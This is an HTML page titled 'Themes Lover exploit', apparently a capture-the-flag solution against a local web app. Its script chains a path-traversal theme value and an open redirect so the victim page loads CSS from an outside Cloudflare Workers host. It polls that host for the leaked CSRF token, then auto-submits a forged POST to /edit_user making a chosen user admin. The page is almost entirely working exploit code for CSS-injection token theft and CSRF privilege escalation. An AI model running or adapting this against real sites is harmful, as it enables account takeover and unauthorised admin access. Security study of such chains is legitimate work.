<!doctype html>
<html lang="zh-Hant">
<head>
  <meta charset="utf-8">
  <title>Themes Lover exploit</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>
<pre id="log">starting...</pre>

<script>
const WORKER_BASE = "https://flat-unit-aed6.xxterenerertxx.workers.dev/";
const TARGET_ORIGIN = "http://localhost:5000";
const TARGET_USER_ID = "1c1b6af3-ad0c-458c-a86f-0d5efeee9851";

const logEl = document.getElementById("log");
function log(...xs) {
  const s = xs.join(" ");
  console.log(s);
  logEl.textContent += "\n" + s;
}

const id = "test123";
const workerHost = new URL(WORKER_BASE).host;

/*
  layout.html:
    <link rel="stylesheet" href="/static/css/{{theme}}.css">

  所以 theme 要設成：
    ../../switch_theme?theme=light&redirect_path=//WORKER/css/ID
*/
const innerTheme =
  `../../switch_theme?theme=light&redirect_path=//${workerHost}/css/${id}`;

const victimUrl =
  `${TARGET_ORIGIN}/switch_theme?theme=${encodeURIComponent(innerTheme)}&redirect_path=/edit_user`;

let victimWin = null;
let navTimer = null;
let pollTimer = null;
let finished = false;

function navVictim() {
  const u = victimUrl + "#r=" + Math.random();
  try {
    if (!victimWin || victimWin.closed) {
      victimWin = window.open(u, "victim");
    } else {
      victimWin.location = u;
    }
  } catch (e) {
    log("[!] nav error", String(e));
  }
}

async function getState() {
  const r = await fetch(`${WORKER_BASE}/state/${id}?r=${Math.random()}`, {
    cache: "no-store"
  });
  return await r.json();
}

function sendFinal(token) {
  if (finished) return;
  finished = true;
  clearInterval(navTimer);
  clearInterval(pollTimer);

  log("[+] token =", token);
  log("[+] sending final POST");

  const form = document.createElement("form");
  form.method = "POST";
  form.action = `${TARGET_ORIGIN}/edit_user`;
  form.target = "victim";
  form.innerHTML = `
    <input name="user_id" value="${TARGET_USER_ID}">
    <input name="username" value="">
    <input name="password" value="">
    <input name="role" value="admin">
    <input name="csrf_token" value="${token}">
  `;
  document.body.appendChild(form);
  form.submit();

  log("[+] submitted");
}

async function poll() {
  try {
    const st = await getState();
    log(`[i] prefix_len=${(st.prefix || "").length} done=${st.done}`);

    if (st.done && st.token) {
      sendFinal(st.token);
    }
  } catch (e) {
    log("[!] poll error", String(e));
  }
}

log("[*] id =", id);
log("[*] victimUrl =", victimUrl);

// 先開一次
navVictim();

// 這裡不要太慢，也不要太快
// 2-char/round 後，60~80ms 通常比上一版 35ms 更穩
navTimer = setInterval(navVictim, 500);
pollTimer = setInterval(poll, 500);
</script>
</body>
</html>
